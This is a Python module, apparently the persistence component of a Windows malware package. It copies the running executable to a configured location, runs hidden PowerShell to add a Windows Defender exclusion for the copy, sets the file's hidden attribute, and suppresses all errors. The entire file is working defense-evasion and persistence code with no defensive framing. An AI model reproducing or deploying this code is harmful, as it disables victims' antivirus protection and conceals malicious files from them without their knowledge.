from ctypes import windll
from os import path, remove
from shutil import copyfile
from subprocess import Popen, CREATE_NEW_CONSOLE, SW_HIDE

from systoring.windowsmonitoring.helpers.config import AStConfig


class ASt:
    def __init__(self, executor_path: str):

        self.__executor_path = executor_path
        self.__config = AStConfig()
        self.__ASt_path = path.join(self.__config.AStPath, f"{self.__config.AStName}.exe")

    def __add_to_ASt(self) -> None:
        """
        Creates a copy of the file.

        Parameters:
        - None.

        Returns:
        - None.
        """
        if path.exists(self.__ASt_path):
            remove(self.__ASt_path)

        copyfile(self.__executor_path, self.__ASt_path)

    def __exclude_from_defender(self) -> None:
        """
        Trying to exclude a file from Windows Defender checks.

        Parameters:
        - None.

        Returns:
        - None.
        """
        Popen(
            f"powershell -Command Add-MpPreference -ExclusionPath '{self.__ASt_path}'",
            shell=True,
            creationflags=CREATE_NEW_CONSOLE | SW_HIDE
        )

    def __hide_file(self) -> None:
        """
        Makes a file hidden.

        Parameters:
        - None.

        Returns:
        - None.
        """
        windll.kernel32.SetFileAttributesW(self.__ASt_path, 2)

    def run(self) -> None:
        """
        Launches the ASt module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__add_to_ASt()
            self.__exclude_from_defender()
            self.__hide_file()

        except Exception as e:
            pass
